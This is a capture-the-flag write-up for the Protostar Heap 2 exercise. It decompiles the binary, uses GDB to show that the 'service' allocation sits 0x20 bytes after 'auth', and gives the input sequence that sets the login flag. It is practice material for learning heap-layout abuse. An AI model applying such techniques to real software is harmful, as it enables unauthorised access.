# Protostar Heap 2

Let's take a look at the binary. Also this challenge is a bit different, the goal is to get it to print `you have logged in already!`:

```
$    file heap2
heap2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=fb7e2a85c0ae98fe79c4fddcd2a5ce4f2d6807bb, not stripped
$    ./heap2
[ auth = (nil), service = (nil) ]
```

So we can see that we are dealing with a `64` bit binary that when we run it, it looks like it displays some sort of menu to us that takes in input via stdin. Taking a look at the main function in Ghidra, we see this:

```
undefined8 main(void)

{
  int authCheck;
  int resetCheck;
  int serviceCheck;
  int loginCheck;
  char *bytesRead;
  size_t lenInput;
  long in_FS_OFFSET;
  char input [5];
  char acStack147 [2];
  char acStack145 [129];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  while( true ) {
    printf("[ auth = %p, service = %p ]\n",auth,service);
    bytesRead = fgets(input,0x80,stdin);
    if (bytesRead == (char *)0x0) break;
    authCheck = strncmp(input,"auth ",5);
    if (authCheck == 0) {
      auth = (char *)malloc(8);
      memset(auth,0,8);
      lenInput = strlen(acStack147);
      if (lenInput < 0x1f) {
        strcpy(auth,acStack147);
      }
    }
    resetCheck = strncmp(input,"reset",5);
    if (resetCheck == 0) {
      free(auth);
    }
    serviceCheck = strncmp(input,"service",6);
    if (serviceCheck == 0) {
      service = strdup(acStack145);
    }
    loginCheck = strncmp(input,"login",5);
    if (loginCheck == 0) {
      if (*(int *)(auth + 0x20) == 0) {
        puts("please enter your password");
      }
      else {
        puts("you have logged in already!");
      }
    }
  
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  
  return 0;
}
```

So looking at the main function, we see that the menu has four separate options `auth/reset/service/login`. This loop runs in a while true loop, which it will scan in `0x80` bytes into `input` with `fgets`. For each iteration of the loop in the beginning, it will print the address of `auth` and `service`. Looking at the `auth` command, we see that it will allocate an eight byte chunk with malloc and set `auth` equal to it. Then it will check if our input past `auth ` is lesser than `0x1f`, and if it is it will copy it to `auth`. Looking at the `reset` option, we see that it just frees `auth` (does not clear the address). Looking at the `service` option we can see that it runs `strdup` on `acStack145`. This is a bit weird, however looking at the stack layout we can see that it is `7` bytes away from the start of our input stored in `input`. So it is running `strdup` on `input+7`, which will just duplicate our input past `service` and store it in the heap. There is no size checking with this one. Finally we have the `login` function. It just checks to see if the integer stored at `auth+0x20` is equal to zero, and if it's not then we solve the challenge (goal of this challenge is to get it to print `you have logged in already!`).

So looking at the code, we need to find a way to set `auth+0x20` to not be equal to `0`. Before we do that, we will need to run the `auth` command to allocate the `auth` pointer, so it doesn't crash when we run the `login` command (an unexploitable crash). We can't write to `auth+0x20` with the `auth` command because of the size check. The `reset` command just frees the space, so we can't write data with that (although when we free memory, it can change some of the values stored in that region of memory). Our best bet would be to go with the `service` command since it let's us scan in data into the heap without a size check. We can confirm that it is in the heap by checking the printed pointer for `service` against the memory mappings in gdb:

```
gef➤  r
Starting program: /Hackery/pod/modules/heap_overflow/protostar_heap2/heap2
[ auth = (nil), service = (nil) ]
auth 15935728
[ auth = 0x555555757a80, service = (nil) ]
service 75395128
[ auth = 0x555555757a80, service = 0x555555757aa0 ]
^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x400             
$rsp   : 0x00007fffffffdd38  →  0x00007ffff7a71148  →  <_IO_file_underflow+296> test rax, rax
$rbp   : 0xd68             
$rsi   : 0x0000555555757670  →  "service 75395128"
$rdi   : 0x0               
$rip   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$r8    : 0x00007ffff7dd18c0  →  0x0000000000000000
$r9    : 0x00007ffff7fda4c0  →  0x00007ffff7fda4c0  →  [loop detected]
$r10   : 0x00007ffff7fda4c0  →  0x00007ffff7fda4c0  →  [loop detected]
$r11   : 0x246             
$r12   : 0x00007ffff7dcb760  →  0x0000000000000000
$r13   : 0x00007ffff7dcc2a0  →  0x0000000000000000
$r14   : 0x00007ffff7dcc2a0  →  0x0000000000000000
$r15   : 0x7f              
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd38│+0x0000: 0x00007ffff7a71148  →  <_IO_file_underflow+296> test rax, rax     ← $rsp
0x00007fffffffdd40│+0x0008: 0x00007ffff7dcfa00  →  0x00000000fbad2288
0x00007fffffffdd48│+0x0010: 0x00007ffff7dcc2a0  →  0x0000000000000000
0x00007fffffffdd50│+0x0018: 0x000000000000000a
0x00007fffffffdd58│+0x0020: 0x0000555555757681  →  0x0000000000000000
0x00007fffffffdd60│+0x0028: 0x00007ffff7dcfa00  →  0x00000000fbad2288
0x00007fffffffdd68│+0x0030: 0x00007ffff7a723f2  →  <_IO_default_uflow+50> cmp eax, 0xffffffff
0x00007fffffffdd70│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7af4075 <read+5>         add    BYTE PTR cs:[rbx+0x75c08500], cl
   0x7ffff7af407c <read+12>        adc    esi, DWORD PTR [rcx]
   0x7ffff7af407e <read+14>        ror    BYTE PTR [rdi], 0x5
 → 0x7ffff7af4081 <read+17>        cmp    rax, 0xfffffffffffff000
   0x7ffff7af4087 <read+23>        ja     0x7ffff7af40e0 <__GI___libc_read+112>
   0x7ffff7af4089 <read+25>        repz   ret
   0x7ffff7af408b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7af4090 <read+32>        push   r12
   0x7ffff7af4092 <read+34>        push   rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heap2", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7af4081 → __GI___libc_read(fd=0x0, buf=0x555555757670, nbytes=0x400)
[#1] 0x7ffff7a71148 → _IO_new_file_underflow(fp=0x7ffff7dcfa00 <_IO_2_1_stdin_>)
[#2] 0x7ffff7a723f2 → __GI__IO_default_uflow(fp=0x7ffff7dcfa00 <_IO_2_1_stdin_>)
[#3] 0x7ffff7a63e62 → __GI__IO_getline_info(eof=0x0, extract_delim=<optimized out>, delim=0xa, n=0x7f, buf=0x7fffffffde10 "service 75395128\n", fp=0x7ffff7dcfa00 <_IO_2_1_stdin_>)
[#4] 0x7ffff7a63e62 → __GI__IO_getline(fp=0x7ffff7dcfa00 <_IO_2_1_stdin_>, buf=0x7fffffffde10 "service 75395128\n", n=<optimized out>, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7a62bcd → _IO_fgets(buf=0x7fffffffde10 "service 75395128\n", n=<optimized out>, fp=0x7ffff7dcfa00 <_IO_2_1_stdin_>)
[#6] 0x5555555549de → main()
────────────────────────────────────────────────────────────────────────────────
0x00007ffff7af4081 in __GI___libc_read (fd=0x0, buf=0x555555757670, nbytes=0x400) at ../sysdeps/unix/sysv/linux/read.c:27
27    ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /Hackery/pod/modules/heap_overflow/protostar_heap2/heap2
0x0000555555755000 0x0000555555756000 0x0000000000001000 r-- /Hackery/pod/modules/heap_overflow/protostar_heap2/heap2
0x0000555555756000 0x0000555555757000 0x0000000000002000 rw- /Hackery/pod/modules/heap_overflow/protostar_heap2/heap2
0x0000555555757000 0x0000555555778000 0x0000000000000000 rw- [heap]
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw-
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd9000 0x00007ffff7fdb000 0x0000000000000000 rw-
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  
```

Here we can see that the `service` pointer (returned by `strdup`) is between `0x0000555555757000` and `0x0000555555778000`, so it is in the heap. So our plan will be to overwrite `auth+0x20` using the service command. Looking at the difference between the two, we see it is `0x555555757aa0 - 0x555555757a80 = 0x20`, so the `service` command after we run `auth` will start writing data directly where we need to be, so in this case we only need to write one byte. With that, we have everything we need:

```
$    ./heap2
[ auth = (nil), service = (nil) ]
auth 15935728
[ auth = 0x55b20955da80, service = (nil) ]
login
please enter your password
[ auth = 0x55b20955da80, service = (nil) ]
service 0
[ auth = 0x55b20955da80, service = 0x55b20955daa0 ]
login
you have logged in already!
[ auth = 0x55b20955da80, service = 0x55b20955daa0 ]
```

With that, we solved the challenge (also just in case you're confused, the `0` we overwrite `auth+0x20` is an ascii zero so it would write `0x30` not `0x0`).
